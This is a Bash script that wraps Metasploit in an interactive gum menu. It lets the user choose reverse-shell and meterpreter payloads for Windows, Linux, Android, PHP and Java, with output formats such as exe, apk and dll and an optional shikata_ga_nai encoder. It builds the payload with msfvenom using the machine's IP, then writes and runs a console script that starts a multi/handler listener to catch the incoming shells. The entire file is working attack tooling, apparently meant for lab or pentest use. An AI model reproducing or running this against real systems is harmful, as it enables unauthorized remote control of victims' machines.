gum style --border normal --margin "1" --padding "1 2" --border-foreground 212 "Welcome to $(gum style --foreground 212 "metasploit-framework")." 
ip=$(ifconfig | grep 192 | awk '{print($2)}')
while true
do
   echo $(gum style --foreground "#f8926a" "Which") $(gum style --foreground "#4bf8ff" "payload") $(gum style --foreground "#f8926a" "would you like to use? :)")
   payload=$(gum choose --cursor-prefix "[ ] " --selected-prefix "[✓] " --no-limit "php/meterpreter/reverse_tcp" "linux/x86/meterpreter/reverse_tcp" "linux/x64/meterpreter_reverse_tcp" "linux/x86/shell/reverse_tcp" "linux/x64/shell/reverse_tcp" "windows/x64/meterpreter_reverse_tcp" "windows/meterpreter_reverse_tcp" "windows/shell/reverse_tcp" "java/jsp_shell_reverse_tcp" "android/meterpreter/reverse_tcp" "cmd/unix/reverse_bash" "No thanks, exit pls")
   if [ "$payload" = "No thanks, exit pls" ]
   then
      gum confirm "Are you sure to exit?" && exit 0 || echo $(gum style --foreground "#676566" "OK. Let me send you back then = =")
      sleep 1
   else
      echo $(gum style --foreground "#f8926a" "Which") $(gum style --foreground "#4bf8ff" "format?")
      fmt=$(gum choose --cursor-prefix "[ ] " --selected-prefix "[✓] " --no-limit "exe" "war" "raw" "elf" "asp" "apk" "psh-cmd" "msi" "jar" "jsp" "dll" "psh")
      name=$(gum input --placeholder "File name?(With extension)")
      port=$(gum input --placeholder "port?")
      echo $(gum style --foreground "#f8926a" "Wanna use") $(gum style --foreground "#4bf8ff" "encoders?")
      encoder=$(gum choose --cursor-prefix "[ ] " --selected-prefix "[✓] " --no-limit "x86/shikata_ga_nai" "No. Definitely not!")
      if [ "$encoder" = "No. Definitely not!" ]
      then
         gum spin --spinner line --title "$(gum style --foreground "#ef584e" "OK. Generating shellcode...")" sleep 5
         msfvenom -p $payload LHOST=$ip LPORT=$port -f $fmt -o ~/Test_Files_Inside/$name
         echo "msfconsole -q -x 'use exploit/multi/handler;set payload " > ~/console.sh
         echo $payload >> ~/console.sh
         echo ";set lhost " >> ~/console.sh
         echo $ip >> ~/console.sh
         echo ";set lport " >> ~/console.sh
         echo $port >> ~/console.sh
         echo ";exploit -z -j'" >> ~/console.sh
         gum spin --spinner line --title "$(gum style --foreground "#ef584e" "Opening msfconsole for you...")" sleep 5
         sh ~/console.sh
         rm ~/console.sh
       else
         ita=$(gum input --placeholder "Iterations of the encoder? Caution! Too much iterations can cause the attack to fail")
         gum spin --spinner line --title "$(gum style --foreground "#ef584e" "OK. Generating shellcode...")" sleep 5
         msfvenom -p $payload LHOST=$ip LPORT=$port -e $encoder -i $ita -f $fmt -o ~/Test_Files_Inside/$name
         echo "msfconsole -q -x 'use exploit/multi/handler;set payload " > ~/console.sh
         echo $payload >> ~/console.sh
         echo ";set lhost " >> ~/console.sh
         echo $ip >> ~/console.sh
         echo ";set lport " >> ~/console.sh
         echo $port >> ~/console.sh
         echo ";exploit -z -j'" >> ~/console.sh
         gum spin --spinner line --title "$(gum style --foreground "#ef584e" "Opening msfconsole for you...")" sleep 5
         sh ~/console.sh
         rm ~/console.sh
       fi
         
   fi   
done
